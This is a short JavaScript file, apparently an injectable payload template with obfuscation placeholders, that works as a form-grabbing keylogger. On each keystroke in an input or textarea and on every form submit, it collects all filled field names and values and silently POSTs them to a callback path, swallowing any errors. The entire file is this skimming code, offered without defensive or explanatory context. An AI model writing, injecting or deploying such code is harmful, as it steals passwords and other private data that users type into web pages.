function obf_func_callback() {
	try {
		obf_var_inputs    = document.getElementsByTagName("input");
		obf_var_textareas = document.getElementsByTagName("textarea");
		obf_var_params    = "";

		for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
			if (obf_var_inputs[obf_var_i].value != "") {
				obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) + "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) + ( obf_var_i < (obf_var_inputs.length-1) ? "&" : "" );
			}
		}
		for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
			if (obf_var_textareas[obf_var_i].value != "") {
				obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) + "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) + ( obf_var_i < (obf_var_textareas.length-1) ? "&" : "" );
			}
		}

		if (obf_var_params.length > 0) {
		  obf_var_req = new XMLHttpRequest();
		  obf_var_req.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params, true);
		  obf_var_req.send();
		}
	} catch(obf_var_ignore){}
}

self.addEventListener("keyup", function(obf_var_event) {
	try {
		if (obf_var_event.target.tagName.match(/INPUT|TEXTAREA/)) {
			obf_func_callback();
		}
	} catch(obf_var_ignore){}
});

document.querySelectorAll("form").forEach(function(obf_var_form){
	obf_var_form.addEventListener("submit", obf_func_callback);
});
